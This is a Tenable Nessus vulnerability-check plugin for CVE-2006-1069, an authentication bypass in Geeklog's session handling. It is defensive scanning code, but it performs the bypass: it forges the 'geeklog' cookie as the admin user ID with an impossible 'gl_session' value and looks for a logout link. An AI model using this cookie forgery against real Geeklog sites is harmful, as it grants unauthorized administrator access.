#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21036);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2012/04/23 00:05:07 $");

  script_cve_id("CVE-2006-1069");
  script_bugtraq_id(17010);
  script_osvdb_id(23703);

  script_name(english:"Geeklog lib-sessions.php Session Cookie Handling Authentication Bypass");
  script_summary(english:"Tries to bypass authentication in Geeklog");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an authentication bypass issue.");
  script_set_attribute(attribute:"description", value:
"The version of Geeklog installed on the remote contains a flaw in its
session-handling library that can be exploited by an attacker to
bypass authentication and gain access as any user, including the
admin.");
  script_set_attribute(attribute:"see_also", value:"http://www.geeklog.net/article.php/geeklog-1.4.0sr2");
  script_set_attribute(attribute:"solution", value:"Upgrade to Geeklog 1.3.9sr5 / 1.3.11sr5 / 1.4.0sr2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/03/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/03/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:geeklog:geeklog");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("geeklog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/geeklog");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/geeklog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  init_cookiejar();

  uid = 2;                             # Admin account.
  sessid = -1;                         # an impossible session id.
  # nb: default cookie names for $_CONF['cookie_name']
  #     and $_CONF['cookie_session'].
  set_http_cookie(name: "geeklog", value: uid);
  set_http_cookie(name: "gl_session", value: sessid);
  r = http_send_recv3(method: "GET", item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if we have been authenticated.
  if (string(dir, '/users.php?mode=logout">') >< r[2])
  {
    security_hole(port);
    exit(0);
  }
}
